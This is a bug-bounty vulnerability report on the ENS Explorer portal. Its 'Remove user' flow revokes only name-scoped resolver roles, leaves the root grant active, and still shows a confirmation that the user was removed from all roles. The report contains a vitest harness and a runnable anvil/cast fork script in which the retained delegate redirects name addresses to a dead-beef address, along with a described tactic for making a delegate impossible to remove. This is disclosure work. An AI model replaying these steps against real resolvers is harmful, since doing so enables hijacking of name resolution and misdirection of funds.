# 90255 w a critical apps portal resolver roles ui remove user revokes only the name scope while confirming removal from all roles the root grant stays active

**Submitted on Aug 24th 2026 at 02:49:28 UTC by @aurorazz for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90255
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

### Intro

Every line of the defect in this report is in `apps/portal` (Explorer app, in scope), in three files: `src/lib/roles/resolverRoles.ts` (groups every scope an account holds into one table row), `src/features/resolver/components/ResolverRolesSidebar.tsx` (picks the scope for every action on that row), and `src/features/resolver/helpers/revokeResolverRoles.ts` (maps that pick to the on-chain call). The ENS smart contracts are out of scope and are not claimed defective; they behave exactly as designed in every control executed below, and appear only as the execution environment for the transaction the application builds.

The Explorer's resolver Roles page groups each account's roles from every scope into one row. Clicking Remove user on an account holding both root (global) and name-scoped roles revokes only the name part, while the dialog says "remove this user from all roles" and the transaction succeeds. I drove the app's own code (grouping, scope pick, transaction builder, all imported unmodified) to produce the exact removal transaction, then executed it on a fork of live Sepolia with the production contracts: the account's root bitmap was unchanged afterward, and the removed account then wrote `addr(node, 60) = 0x...DeaDBeef` for a name on that resolver. In production, an operator ejecting a rogue delegate gets a false confirmation and the delegate keeps addr-write authority over every name on that resolver indefinitely. Worse, a delegate can create the mixed-row precondition deliberately with one innocuous-looking grant request, making the app's only ejection control structurally incapable of ever stripping their root grant.

### Vulnerability details

The bug is entirely client side. On `/resolver/$address/roles`, the same "Remove user" click that confirms "remove this user from all roles" builds a transaction that only revokes one scope. The contracts are correct by design; the app just never asks for what the copy promises.

Measured on the production deployments (fork of live Sepolia, block 11553325):

```
pre-state:   roles(0, B) = 1, roles(resource, B) = 16
UI remove:   authorizeNameRoles(dns("harmonia.eth"), 0x11, B, false) -> status 0x1
post-state:  roles(0, B) = 1  (root RETAINED),   roles(resource, B) = 0
removed B writes addr(node("harmonia.eth"), 60) = 0x...deadbeef  -> succeeds
removed B writes addr(node("crypto.eth"), 60)  = 0x...deadbeef   -> succeeds
             (crypto.eth line is the retained grant's blast radius, not a second bug)
```

The app unions every scope into one row (`apps/portal/src/lib/roles/resolverRoles.ts:179-221`, `groupRolesByAccount`) and treats the FIRST NON-ROOT name as the scope for all edits (`ResolverRolesSidebar.tsx:169`):

```tsx
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

On "Remove user" the sidebar then sends the union of `decodedRoles` with that single name (`ResolverRolesSidebar.tsx:307-323`):

```tsx
setPendingAction({
  type: 'remove',
  name: roleName,             // <- the first non-root name, nothing else
  account: selectedAccount,
  roles: decodedRoles,        // <- the union across scopes
})
```

...and `revokeResolverRoles.ts:45-61` picks `name` scope unless the name is `''` - a path that an account holding both root and any name grant can never take:

```ts
name === ''
  ? { resolverAddress, targetAccount: account, scope: 'root', roles: roles as ResolverRole[] }
  : { resolverAddress, targetAccount: account, scope: 'name', name, roles: roles as ResolverRole[] },
```

On a mixed row, `roleName` is the first non-root name, never `''`, so `revokeRootRoles` is structurally unreachable from this flow.

One contract detail explains why nothing reverts, and it is the contract behaving as designed: `_revokeRoles` clears with `uint256 updatedRoles = currentRoles & ~roleBitmap;` (verbatim) and does not revert on bits the account does not hold at that resource. The root bits in the union mask are ignored rather than rejected - the app is what hands the contract a mask it can only partially honor. Wrong scope plus the non-reverting clear is what produces a successful transaction carrying a false confirmation.

This is also not an inferred transaction. I executed the app's own grouping + transaction builder (`vitest` in `scripts/print-remove-calldata.test.ts`, PoC below) against the mixed row; the emitted intent calldata is byte-identical to the fork PoC's `cast` command:

```
app-built intent:  to   0xa1c8256043f3bdd5b683f570db40bc936b7dd294
                   data 0xbbd9abb5 (authorizeNameRoles(bytes,uint256,address,bool))
                        ... roleBitmap 0x11 ... grant=false ... dns("harmonia.eth")
fork PoC:          cast send 0xa1c825... "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x11 $B false
                   -> byte-identical (asserted by the harness, output below)
```

Formation is the app's own default: the Add-user sheet defaults its scope combobox to root (`ResolverAddUserSheet.tsx:127`), and the resolver owner holds the full root init bitmap, so mixed rows are the natural state.

And controls, all as the contracts intend: roleless account reverts on write; B revoking itself reverts (so the wrong-scope tx can only come from the operator through the app); owner calling `revokeRootRoles(1, B)` drops the root bitmap to 0 and B's write then reverts. The correct call exists; the client doesn't build it for mixed rows.

### Impact details

Selected impact, listed under Critical on the scope page: "Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: resolving or rendering an ENS name to an attacker-controlled address." Both halves executed: the operator is shown "Are you sure you want to remove this user from all roles? This action cannot be undone." at signature time while the transaction being signed revokes one scope only; and the resulting state is the category's first listed example - the removed account writes `addr(node, 60)` to an attacker-controlled address for names on that resolver (PoC below), so anyone resolving those names (Explorer, Manager, wallets, any client reading that resolver) sends funds or transactions to an unintended recipient.

The delegate can also create the precondition deliberately. Holding root, which is the Add user sheet's default scope, they request one additional name-scoped grant on a name they already work on. The request is innocuous. From that point the Remove user button is structurally incapable of stripping their root grant, and every removal attempt confirms success while leaving it intact. What the delegate gains is not a permission but immunity from revocation; the authority that changes hands is the operator's. (The contract side is designed exactly this way; the app is what makes the operator's ejection control a no-op against it.)

Recovery requires the operator to disbelieve a success confirmation the application has just given them. The flow ends in a success state and the sidebar closes on it (`ResolverRolesSidebar.tsx:503-508`), the app waits for the indexer to sync and refetches (`:278-287`), and the account reappears in the table with its remaining global roles, under the same "Global roles (all names)" subtitle the mixed row had before. In an application where tables trail chain state, a row still present after a confirmed removal reads as indexer lag. The one signal that would expose the partial revoke is the one the interface trains operators to discount. The retained grant has no expiry.

This is not a cosmetic defect, and the exclusions do not reach it. The failed action is the application's only corrective control over an account whose authority the operator has decided to remove, and the transaction the operator signs does not perform the action the dialog describes - not the UX/UI exclusion. The operator is the deceived party and the delegate needs nothing beyond the routine grants the Add user flow gives any added account - not the privileged-addresses exclusion. Calibration against the program's known-issues document (internal auditor grades): WEB-626 (High) is the closest analogue - misleading modal copy at confirmation time with no on-chain consequence; this finding is that class plus an executed consequence.

Reported at Critical.

## References

* repo at pin: <https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae>
* <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L221>
* <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L169> and #L307-L323 and #L391-L396 and #L446-L447 and #L503-L508 and #L278-L287
* <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L45-L61> (grant side: grantResolverRoles.ts)
* <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx#L127>
* <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/resolver/%24address/roles/index.tsx#L41-L50>
* ensjs (pinned branch feature/fet-1885-ensjs-refactor): `packages/ensjs/src/actions/wallet/v2/grantResolverRoles.ts`, `revokeResolverRoles.ts`
* Contracts, execution environment only, behaving as designed in every control: Blockscout-verified PermissionedResolverImpl `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e` (`PermissionedResolver.sol:273-294, 665`; `EnhancedAccessControl.sol:444-455`)
* Program scope page (impacts, exclusions): <https://immunefi.com/audit-competition/audit-competition-ens/scope/>

## Proof of Concept

### PoC

Two parts: the client-side reproduction (the in-scope evidence - the app's own code producing the removal transaction, no chain interaction), then the on-chain consequence run in an appendix where the contracts serve only as the execution environment.

### Client-side reproduction (apps/portal, no chain interaction)

This vitest file drives the app's own grouping (`groupRolesByAccount`), the sidebar's verbatim scope pick, and the app's own transaction builder (`prepareRevokeResolverRolesTransaction`) - all imported unmodified - with the two indexer records of the mixed row, and asserts the produced intent is byte-identical to the removal transaction executed in the appendix.

Run:

```bash
pnpm install && pnpm -C apps/portal exec vitest run scripts/print-remove-calldata.test.ts
```

```ts
// apps/portal/scripts/print-remove-calldata.test.ts
// Prints the exact calldata the Explorer's resolver-roles "Remove user" flow
// produces for a mixed-scope account, built by the app's own source files
// (unmodified): groupRolesByAccount + the sidebar's verbatim scope pick +
// prepareRevokeResolverRolesTransaction. Asserts the produced intent is
// byte-identical to the fork PoC's cast send.
// run: pnpm -C apps/portal exec vitest run scripts/print-remove-calldata.test.ts

import type { WalletClient } from 'viem'
import { describe, expect, it } from 'vitest'
import {
  buildResourceToNameMap,
  groupRolesByAccount,
  type ResolverRoleKey,
} from '../src/lib/roles/resolverRoles'
import { prepareRevokeResolverRolesTransaction } from '../src/features/resolver/helpers/revokeResolverRoles'

const RESOLVER = '0xa1c8256043f3bdd5b683f570db40bc936b7dd294' as const
const OWNER = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' as const
const B = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' as const

// What the indexer returns for the mixed row built in the fork PoC:
// B holds root ROLE_SET_ADDR (bitmap 0x1) + name-scope ROLE_SET_TEXT on
// harmonia.eth (0x10). Same two records the fork readbacks print.
const indexerRoles = [
  {
    account: B,
    resource:
      '0x0000000000000000000000000000000000000000000000000000000000000000',
    roleBitmap: '1',
  },
  {
    account: B,
    resource:
      '0x4234bb81fe55340abfd83a35ea9be4edc9ccb26e197dc842ec4137e9a03d1de1',
    roleBitmap: '16',
  },
]
const nodes = [{ name: 'harmonia.eth' }]

// The builder reads walletClient.account.address and walletClient.chain.id,
// then forwards the object to ensjs' parameter builder, which by inspection
// uses the same two fields for encoding. No signing or network I/O happens
// inside prepareRevokeResolverRolesTransaction, so a structural stand-in
// carrying those two fields exercises the identical code path the sidebar's
// removeUserMutation drives with a real wallet client. The claim under test
// is the calldata the app prepares, not the signature.
const stubWalletClient = {
  account: { address: OWNER },
  chain: { id: 11155111 },
} as WalletClient

// toEoaCustomIntent (intents.ts:11-33) returns { type: 'custom', request: {
// to, data, ... } }; those two request fields are what the wallet signs.
const requestOf = (intent: unknown) =>
  (intent as { request: { to: string; data: `0x${string}` } }).request

describe('remove-user produced calldata (mixed row)', () => {
  it('is authorizeNameRoles(name, unionBitmap, B, false) at the first non-root name', () => {
    const rows = groupRolesByAccount(indexerRoles, buildResourceToNameMap(nodes))
    const row = rows[0]
    console.log('row.decodedRoles :', row.decodedRoles)
    console.log('row.resolvedNames:', row.resolvedNames)

    // ResolverRolesSidebar.tsx:169 + handleRemoveUser (:307-323), verbatim
    const roleName = row.resolvedNames.find((n) => n !== '(root)') ?? ''
    console.log('roleName picked by the sidebar:', JSON.stringify(roleName))

    // decodedRoles holds the exact strings decodeResolverRoleBitmap emitted,
    // i.e. ResolverRoleKey values; the array keeps the row's string[] type.
    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: B,
      roles: row.decodedRoles as ResolverRoleKey[],
      walletClient: stubWalletClient,
      chainId: 11155111,
    })

    const { to, data } = requestOf(intent)
    console.log('to  :', to)
    console.log('data:', data)

    // byte-compare against the exact cast encoding of the fork PoC's send:
    // cast calldata "authorizeNameRoles(bytes,uint256,address,bool)"
    //   0x086861726d6f6e69610365746800 \
    //   0x11 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 false
    const pocEquivalent =
      '0xbbd9abb5' +
      '0000000000000000000000000000000000000000000000000000000000000080' +
      '0000000000000000000000000000000000000000000000000000000000000011' +
      '00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8' +
      '0000000000000000000000000000000000000000000000000000000000000000' +
      '000000000000000000000000000000000000000000000000000000000000000e' +
      '086861726d6f6e69610365746800000000000000000000000000000000000000'

    // selector authorizeNameRoles(bytes,uint256,address,bool) = 0xbbd9abb5
    expect(to.toLowerCase()).toBe(RESOLVER.toLowerCase())
    expect(data.slice(0, 10)).toBe('0xbbd9abb5')
    expect(data.toLowerCase()).toBe(pocEquivalent.toLowerCase())
    console.log('IDENTICAL:', data.toLowerCase() === pocEquivalent.toLowerCase())
  })
})
```

Output of my run (vitest 4.1.5, repo pinned at `1c9b47f`):

```
row.decodedRoles : [ 'ROLE_SET_ADDR', 'ROLE_SET_TEXT' ]
row.resolvedNames: [ '(root)', 'harmonia.eth' ]
roleName picked by the sidebar: "harmonia.eth"
to  : 0xa1c8256043f3bdd5b683f570db40bc936b7dd294
data: 0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e086861726d6f6e69610365746800000000000000000000000000000000000000
IDENTICAL: true
Tests  1 passed (1)
```

The application's own code produces `authorizeNameRoles(dns("harmonia.eth"), 0x11, B, false)`: the union bitmap, one name scope, root half unreachable.

### Appendix: on-chain consequence (execution environment only; contracts behave as designed in every control)

Environment: foundry (`anvil` + `cast`). Fork of live Sepolia pinned to block 11553325 (transcript executed at that block; deterministic). Copy paste everything.

#### Contracts

Used as the execution environment for the app's transaction:

* VerifiableFactory `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`
* PermissionedResolverImpl `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`

#### Start the fork

```bash
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --fork-block-number 11553325 --chain-id 11155111 --port 8545
```

#### env (paste one time only)

```bash
RPC=http://127.0.0.1:8545
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e
A=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
PK_A=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
B=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
PK_B=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
Z=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
PK_Z=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
C2=0xa1c8256043f3bdd5b683f570db40bc936b7dd294
SALT=0xe31a7f93245359127604e49b10a834c7c995d4ecc83b2ca3e32df518871decf3
INIT=0x7058b559000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266111111111111111111111111111111111111111111111111111111111111111100000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000
DNS=0x086861726d6f6e69610365746800
NODE1=0xb118836f8aa469304ea88f775a3944618596e58dbbaadb78b1e92bde67dd6ffc
NODE2=0xf1349714113694d6ed77f7a709bf992fc0297ad9e820d3083f0ab95376e51c02
RES=0x4234bb81fe55340abfd83a35ea9be4edc9ccb26e197dc842ec4137e9a03d1de1
EVIL=0x00000000000000000000000000000000DeaDBeef
```

{% stepper %}
{% step %}

## Setup

```bash
# 1. deploy resolver via the app's own encoding (owner A, full root init bitmap)
cast send $FACTORY "deployProxy(address,uint256,bytes)" $IMPL $SALT $INIT --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 3000000
# -> status 0x1, resolver at $C2

# 2. operator grants B root ROLE_SET_ADDR (the Add-user sheet's default scope)
cast send $C2 "grantRootRoles(uint256,address)" 1 $B --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000

# 3. operator grants B name-scope ROLE_SET_TEXT on harmonia.eth (the innocuous request)
cast send $C2 "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x10 $B true --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000

# pre-state: the mixed row the sidebar shows
cast call $C2 "roles(uint256,address)(uint256)" 0 $B --rpc-url $RPC
# -> 1
cast call $C2 "roles(uint256,address)(uint256)" $RES $B --rpc-url $RPC
# -> 16
```

{% endstep %}

{% step %}

## The app's removal transaction

Byte-identical to the app-built intent above:

```bash
cast send $C2 "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x11 $B false --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000
# -> status 0x1
```

{% endstep %}

{% step %}

## Post-state

Expected zero everywhere; actual:

```bash
cast call $C2 "roles(uint256,address)(uint256)" 0 $B --rpc-url $RPC
# -> 1    <== ROOT ROLE STILL THERE
cast call $C2 "roles(uint256,address)(uint256)" $RES $B --rpc-url $RPC
# -> 0    <== only the name part died
```

{% endstep %}

{% step %}

## Consequence

The removed account still writes records, resolver-wide:

```bash
cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE1 60 $EVIL --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000
cast call $C2 "addr(bytes32,uint256)(bytes)" $NODE1 60 --rpc-url $RPC
# -> 0x00000000000000000000000000000000deadbeef

cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE2 60 $EVIL --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000
cast call $C2 "addr(bytes32,uint256)(bytes)" $NODE2 60 --rpc-url $RPC
# -> 0x00000000000000000000000000000000deadbeef
```

{% endstep %}

{% step %}

## Controls

Every contract behaves as designed:

```bash
# roleless Z -> REVERTS (the gate itself works)
cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE1 60 $EVIL --from $Z --private-key $PK_Z --rpc-url $RPC --gas-limit 300000

# B revoking itself -> REVERTS (only role-admins revoke; the wrong-scope tx can only come from the operator through the app)
cast send $C2 "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x11 $B false --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000

# the CORRECT removal exists; the client never builds it for mixed rows
cast send $C2 "revokeRootRoles(uint256,address)" 1 $B --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000
cast call $C2 "roles(uint256,address)(uint256)" 0 $B --rpc-url $RPC
# -> 0
cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE1 60 $EVIL --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000
# -> REVERTS
```

{% endstep %}
{% endstepper %}

**Expected vs actual**: the dialog says "remove this user from all roles". Expected after removal: `roles(0,B) = 0`. Actual: `roles(0,B) = 1`, and B writes addr records for any name on the resolver afterward.

Executed transcript at the pinned block:

```
before: root=1 name=16
4. ui remove-user tx: status 0x1
   after:  root=1 name=0     << root still there, only the name part died
5a. harmonia.eth addr write: status 0x1
5b. crypto.eth  addr write: status 0x1
    readbacks: 0x00000000000000000000000000000000deadbeef / 0x00000000000000000000000000000000deadbeef
6. Z (never had roles): reverted as expected
7. B revoking itself:   reverted as expected (only role-admins revoke)
8. the real removal:    status 0x1 -> root=0
   then B tries again:  reverted - removal complete
```

**Rig notes for a re-run**: the fork block is pinned, so the run is deterministic - two independent runs at this pin produced byte-identical transactions; the only values that are chain-historical are the factory/impl bytecodes, and the CREATE2 address was unoccupied at that height. If a cold cast send against a public-RPC fork intermittently reverts, issue the identical call once as `cast call` first, then send. `setAddr` takes the raw 20 address bytes for coin 60, not an ABI word. Verification boundary, stated plainly: the transactions and their on-chain consequences were executed; the UI behavior (dialog copy, subtitle, table contents after refetch) is derived from the pinned source, not observed in a running app, and the portal citations are from the pinned repo clone, not from a byte-diffed deployed bundle.
